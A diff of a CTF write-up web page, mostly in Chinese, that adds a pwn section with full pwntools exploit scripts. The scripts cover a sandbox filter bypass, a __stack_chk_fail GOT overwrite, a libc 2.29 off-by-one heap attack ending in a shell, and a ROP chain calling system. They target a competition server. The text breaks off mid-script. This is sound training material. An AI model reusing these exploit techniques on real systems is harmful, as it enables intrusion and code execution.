@@ -344,6 +344,68 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#pwn" class="md-nav__link">
+    pwn
+  </a>
+  
+    <nav class="md-nav" aria-label="pwn">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#taqinioj-0-100" class="md-nav__link">
+    TaQiniOJ-0 - 100
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#memory-moster-i" class="md-nav__link">
+    Memory Moster Ⅰ
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#happyending" class="md-nav__link">
+    happyending
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#secret2" class="md-nav__link">
+    Secret2
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#memory-moster-ii" class="md-nav__link">
+    Memory Moster Ⅱ
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#memory-mosteriii" class="md-nav__link">
+    Memory MosterⅢ
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#easybabystack" class="md-nav__link">
+    easybabystack
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -451,6 +513,68 @@
           <li class="md-nav__item">
   <a href="#easylcg" class="md-nav__link">
     easyLCG
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pwn" class="md-nav__link">
+    pwn
+  </a>
+  
+    <nav class="md-nav" aria-label="pwn">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#taqinioj-0-100" class="md-nav__link">
+    TaQiniOJ-0 - 100
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#memory-moster-i" class="md-nav__link">
+    Memory Moster Ⅰ
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#happyending" class="md-nav__link">
+    happyending
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#secret2" class="md-nav__link">
+    Secret2
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#memory-moster-ii" class="md-nav__link">
+    Memory Moster Ⅱ
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#memory-mosteriii" class="md-nav__link">
+    Memory MosterⅢ
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#easybabystack" class="md-nav__link">
+    easybabystack
   </a>
   
 </li>
@@ -597,6 +721,411 @@
         <span class="k">return</span> <span class="nb">pow</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">g</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span> <span class="bp">self</span><span class="o">.</span><span class="n">m</span><span class="p">),</span> <span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
 <span class="c1">#DH = DH()</span>
 <span class="nb">print</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">DH</span><span class="p">()</span><span class="o">.</span><span class="n">key</span> <span class="o">^</span> <span class="mi">13040004482819935755130996285494678592830702618071750116744173145400949521388647864913527703</span><span class="p">)</span>
+</code></pre></div>
+
+<h2 id="pwn">pwn<a class="headerlink" href="#pwn" title="Permanent link">&para;</a></h2>
+<h3 id="taqinioj-0-100">TaQiniOJ-0 - 100<a class="headerlink" href="#taqinioj-0-100" title="Permanent link">&para;</a></h3>
+<p>程序模拟了c语言编译器，但是对输入c代码进行了敏感字符过滤可以利用字符拼接，异或操作等使敏感字符在程序运行中得到而不是在将其输入到c代码中。</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
+    <span class="n">sh</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;183.129.189.60&#39;</span><span class="p">,</span><span class="mi">10002</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">sh</span><span class="o">=</span><span class="n">process</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;I386&#39;</span><span class="p">]:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
+
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">]:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
+<span class="n">code</span><span class="o">=</span><span class="s1">&#39;&#39;&#39;</span>
+<span class="s1">#include &lt;stdio.h&gt;</span>
+<span class="s1">#include &lt;stdlib.h&gt;</span>
+<span class="s1">char name[20]=&quot;/hom&quot;;</span>
+<span class="s1">char a[]=&quot;e/ct&quot;;</span>
+<span class="s1">char b[]=&quot;f/fl&quot;;</span>
+<span class="s1">char c[2]=&quot;ag&quot;;</span>
+<span class="s1">char ff[0x300];</span>
+<span class="s1">int main()</span>
+<span class="s1">{</span>
+<span class="s1">    for(int i=0;i&lt;4;i++)</span>
+<span class="s1">        name[4+i]=a[i];</span>
+<span class="s1">    for(int i=0;i&lt;4;i++)</span>
+<span class="s1">        name[8+i]=b[i];</span>
+<span class="s1">    name[12]=c[0];</span>
+<span class="s1">    name[13]=c[1];</span>
+<span class="s1">    printf(&quot;</span><span class="si">%s</span><span class="s1">&quot;,name);</span>
+<span class="s1">    FILE * fd=fopen(name,&quot;r&quot;);</span>
+<span class="s1">    if(fd==-1)</span>
+<span class="s1">    {</span>
+<span class="s1">        printf(&quot;error&quot;);</span>
+<span class="s1">        return 0;</span>
+<span class="s1">    }</span>
+<span class="s1">    fread(ff,1,0x100,fd);</span>
+<span class="s1">    printf(&quot;</span><span class="si">%s</span><span class="s1">&quot;,ff);</span>
+<span class="s1">    return 0;</span>
+<span class="s1">}@</span>
+<span class="s1">&#39;&#39;&#39;</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">test</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+
+<p>这个题目还有一个非预期解</p>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&#39;/home/ctf/fl\</span><span class="cp"></span>
+<span class="cp">ag&#39;</span>
+</code></pre></div>
+
+<p>这个方法也可用来做TaQiniOJ-1</p>
+<h3 id="memory-moster-i">Memory Moster Ⅰ<a class="headerlink" href="#memory-moster-i" title="Permanent link">&para;</a></h3>
+<p>栈溢出，但是有Canary保护，所以可以劫持__stack_chk_fail函数来getshell</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
+    <span class="n">sh</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;183.129.189.60&#39;</span><span class="p">,</span><span class="mi">10081</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">sh</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;I386&#39;</span><span class="p">]:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
+
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">]:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
+<span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+<span class="n">stack_fail</span><span class="o">=</span><span class="mh">0x0000000000404028</span>
+<span class="n">target</span><span class="o">=</span><span class="mh">0x000000000040124A</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;addr:&#39;</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">stack_fail</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x30</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;data:&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+
+<h3 id="happyending">happyending<a class="headerlink" href="#happyending" title="Permanent link">&para;</a></h3>
+<p>libc2.29下的off_by_one，需要绕过presize和unlink检测，但是没有办法泄漏heap的地址，所以需要灵活的利用largbin，smallbin fastbin残留的数据来bypass前面的检测，进而利用off_by_one完成对合并实现chunk overlapping。之后就可以利用tcache_dup来达到任意地址分配的目的，修改__malloc_hook来getshell</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
+    <span class="n">sh</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;183.129.189.60&#39;</span><span class="p">,</span><span class="mi">10106</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">sh</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;I386&#39;</span><span class="p">]:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
+
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">]:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
+
+<span class="k">def</span> <span class="nf">choice</span><span class="p">(</span><span class="n">elect</span><span class="p">):</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">elect</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
+    <span class="n">choice</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;!&#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+    <span class="n">choice</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+    <span class="n">choice</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
+<span class="c1">#padding</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">,</span><span class="s1">&#39;padding&#39;</span><span class="p">)</span> <span class="c1">#+0-2</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0xc20</span><span class="p">,</span><span class="s1">&#39;padding&#39;</span><span class="p">)</span> <span class="c1">#+3</span>
+
+<span class="c1">#get fake chunk</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="c1">#+4-10</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0xb00</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="c1">#11</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="c1">#12</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span> <span class="c1">#-11</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x201</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x40</span><span class="p">))</span> <span class="c1">#11</span>
+
+<span class="c1">#make fake chunk fd-&gt;bk=fake chunk</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0xb00</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="c1">#13 ==&gt;make 12 to largebin</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x10</span><span class="p">))</span> <span class="c1">#14</span>
+
+<span class="c1">#make fake chunk bk-&gt;fd=fake chunk</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="c1">#15</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="c1">#16</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+    <span class="n">delete</span><span class="p">(</span><span class="mi">4</span><span class="o">+</span><span class="n">i</span><span class="p">)</span> <span class="c1">#-4-10</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span> <span class="c1">#-15</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span> <span class="c1">#-11</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="c1">#+4-10</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x10</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#+11 ==&gt;modify fake chunk</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="c1">#+15</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="c1">#17</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="c1">#18</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="c1">#19</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x8f0</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="c1">#20</span>
+
+<span class="c1"># null of by one</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">19</span><span class="p">)</span> <span class="c1">#-19</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x200</span><span class="p">))</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span> <span class="c1">#-20</span>
+<span class="c1">#leak libc</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="c1">#+19</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="c1">#+21</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x9b0</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="c1">#+22</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="c1">#23-29</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+    <span class="n">delete</span><span class="p">(</span><span class="mi">23</span><span class="o">+</span><span class="n">i</span><span class="p">)</span> <span class="c1">#-23-29</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">21</span><span class="p">)</span>
+<span class="n">show</span><span class="p">(</span><span class="mi">17</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">libc_base</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span><span class="o">-</span><span class="mh">0x1e4ca0</span>
+<span class="n">malloc_hook</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__malloc_hook&#39;</span><span class="p">]</span>
+<span class="n">realloc</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;realloc&#39;</span><span class="p">]</span>
+<span class="n">onegadget</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x106ef8</span>
+<span class="nb">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">onegadget</span><span class="p">)</span>
+<span class="c1">#tcache dup</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">22</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0xa40</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">17</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x91</span><span class="p">))</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">18</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">22</span><span class="p">)</span>
+<span class="c1">#get shell</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0xa40</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">17</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x91</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">malloc_hook</span><span class="o">-</span><span class="mi">8</span><span class="p">))</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">onegadget</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">realloc</span><span class="o">+</span><span class="mi">6</span><span class="p">))</span>
+<span class="n">choice</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;200&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+
+<h3 id="secret2">Secret2<a class="headerlink" href="#secret2" title="Permanent link">&para;</a></h3>
+<p>每循环一次都会打开一次设备，而linux默认情况下最多只能打开1024个设备，所以当打开超过1024以后，将会打开失败，而读取打开失败的文件设备读入数据将会是零。</p>
+<p>程序还存在一个栈溢出漏洞，但是关闭了输入设备，所以我们的payload要一次性就可以获得flag，我们主要到程序中有一个字符串cat/flag，如果我们可以将这个字符串拷贝到bss段，并将/替换为空格，那我们就可以利用system来获得flag。刚好我们有memcpt，memset函数可以使用，接下来需要解决的问题就是去控制rdi，rsi，rdx三个寄存器的值，程序没有pop rdx；ret这样的gadget，所以我们只能利用libc_scu_init来执行函数，这里要注意灵活组合payload，不要浪费任何一个字节，因为用libc_sct_init来执行函数的话，需要的溢出空间比较大，而我们只能溢出0x100-9的地址，所以要好好的组合。</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
+    <span class="n">sh</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;183.129.189.60&#39;</span><span class="p">,</span><span class="mi">10051</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">sh</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;I386&#39;</span><span class="p">]:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
+
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">]:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
+<span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./secret2&#39;</span><span class="p">)</span>
+<span class="c1">#make payload</span>
+<span class="n">bss</span><span class="o">=</span><span class="mh">0x00000000004040A8</span>
+<span class="n">pop6_ret</span><span class="o">=</span><span class="mh">0x401612</span>
+<span class="n">begin</span><span class="o">=</span><span class="mh">0x4015f8</span>
+<span class="n">memcpy</span><span class="o">=</span><span class="mh">0x0000000000404060</span>
+<span class="n">memset</span><span class="o">=</span><span class="mh">0x0000000000404040</span>
+<span class="n">rdi_ret</span><span class="o">=</span><span class="mh">0x000000000040161b</span>
+<span class="n">system</span><span class="o">=</span><span class="mh">0x0000000000401060</span>
+<span class="k">def</span> <span class="nf">make_payload</span><span class="p">(</span><span class="n">rdi</span><span class="p">,</span><span class="n">rsi</span><span class="p">,</span><span class="n">rdx</span><span class="p">,</span><span class="n">func</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">func</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rsi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rdx</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">begin</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">p</span>
+<span class="n">payload</span><span class="o">=</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">9</span>
+<span class="c1">#1</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop6_ret</span><span class="p">)</span><span class="o">+</span><span class="n">make_payload</span><span class="p">(</span><span class="n">bss</span><span class="p">,</span><span class="mh">0x0000000004021DB</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="n">memcpy</span><span class="p">)</span>
+<span class="c1">#2</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">make_payload</span><span class="p">(</span><span class="n">bss</span><span class="o">+</span><span class="mi">3</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="n">memset</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">7</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rdi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+<span class="nb">print</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
